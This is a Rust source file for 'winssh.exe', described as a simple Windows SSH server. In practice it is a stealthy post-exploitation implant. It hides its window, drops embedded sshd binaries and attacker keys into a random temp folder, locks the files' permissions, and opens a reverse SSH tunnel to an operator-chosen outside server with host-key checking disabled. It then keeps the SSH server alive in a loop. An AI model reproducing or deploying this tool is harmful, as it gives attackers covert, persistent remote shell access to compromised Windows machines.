#![windows_subsystem = "windows"] // hides window
use std::fs;
use clap::{Parser};
use rand::{distributions::Alphanumeric, Rng};
use rust_embed::RustEmbed;
use std::path::{Path};
use std::process::{Command,Stdio};
use std::os::windows::process::CommandExt;
use std::{thread, time::Duration};

const CREATE_NO_WINDOW: u32 = 0x08000000;
const DETACHED_PROCESS: u32 = 0x00000008;

#[derive(RustEmbed)]
#[folder = "files/"]
struct Asset;

#[derive(Parser)]
#[clap(name="winssh.exe", author="xct (@xct_de)", version="1.0", about="simple ssh server on windows", long_about = None)]
#[clap(propagate_version = true)]
struct Cli {
    #[clap(short, long, default_value_t = 8022)] 
    port: u16,
    #[clap(short, long, default_value = "tunnel_default")]
    tunnel_server: String,
    #[clap(short, long, default_value_t = 22 )]
    tunnel_port: u16,
    #[clap(short, long, default_value = "tunnel")]
    tunnel_user: String
}

fn main() {
    let cli = Cli::parse();    
    let port = cli.port;
    let tunnel_server = cli.tunnel_server;
    let tunnel_port =cli.tunnel_port;
    let tunnel_user = cli.tunnel_user;


    let rs: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(6)
        .map(char::from)
        .collect();  
    
    let tmp = format!("C:\\windows\\temp\\{}", rs);
    fs::create_dir(&tmp).unwrap();

    let username_cmd_output = Command::new("powershell")
        .arg("-c")
        .arg("
            Write-Host $env:USERDOMAIN\\$env:USERNAME;")
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .unwrap();
    let username = String::from_utf8(username_cmd_output.stdout).unwrap();

    let files = ["host_rsa.pub", "host_dsa.pub", "host_rsa", "host_dsa","authorized_keys","sshd.exe","sshd.pid","key_reverse"];
    for i in 0..files.len() {
        let f = Asset::get(files[i]).unwrap();
        let path = Path::new(&tmp).join(files[i]);
        fs::write(&path, f.data.as_ref()).unwrap();

        let pathstr = path.display();
        let cmd = format!("$FilePath = \"{}\";           
            $acl = Get-Acl $FilePath;
            $acl.SetAccessRuleProtection($true, $false);
            $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $username = $identity.Name
            $sid = $identity.User.Value;
            $acl.Access | Where-Object   {{ $_.IdentityReference -ne $username }} | ForEach-Object {{ $acl.RemoveAccessRule($_) }};
            $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($username, \"FullControl\", \"Allow\");
            $acl.AddAccessRule($accessRule);
            Set-Acl $FilePath $acl;", pathstr);
        Command::new("powershell").arg("-c")
        .arg(cmd)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .unwrap();        
    }



    let tmp_abs = Path::new(&tmp).canonicalize().unwrap().display().to_string();
    let tmp_as = &tmp_abs[4..tmp_abs.len()]; // remove \\?\
    let config = format!("Port {}\n\
        Banner banner.txt\n\
        ListenAddress 127.0.0.1\n\
        HostKey \"{}\\host_rsa\"\n\
        HostKey \"{}\\host_dsa\"\n\
        PubkeyAuthentication yes\n\
        AuthorizedKeysFile \"{}\\authorized_keys\"\n\
        GatewayPorts yes\n\
        PidFile \"{}\\sshd.pid\"\n\
    ",port,tmp_as,tmp_as,tmp_as,tmp_as);

    let path_sshd_config = Path::new(&tmp).join("sshd_config");
    fs::write(&path_sshd_config, config).unwrap();

    let banner = format!("{}\n",username);
    let path_banner = Path::new(&tmp).join("banner.txt");
    fs::write(&path_banner, banner).unwrap();

    thread::sleep(Duration::from_millis(2000));

    if tunnel_server.ne("tunnel_default") {
        // create the tunnel and remote port forward
        println!("Creating reverse port forward for port {} on server {} as user {}\n",port,tunnel_server,tunnel_user);
        let rev = format!("Push-Location \"{}\"; ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i \"{}\\key_reverse\" -R {}:127.0.0.1:{} -p {} {}@{} ;",tmp_as, tmp_as, port,port,tunnel_port,tunnel_user, tunnel_server );
        Command::new("powershell").stdout(Stdio::null()).arg("-c").arg(&rev).creation_flags(CREATE_NO_WINDOW).spawn();
    }
    // start server
    let cmd = format!("Push-Location \"{}\"; .\\sshd.exe -f \"{}\\sshd_config\" -E \"{}\\log.txt\" -d; Pop-Location", tmp_as, tmp_as, tmp_as );
    println!("Running SSH-Server on port {}\n", port);
    // every ssh connect would close the server, hence the loop
    loop {
        Command::new("powershell").arg("-c")
            .arg(&cmd)
            .creation_flags(CREATE_NO_WINDOW)
            .status() 
            .unwrap();   
    }
}
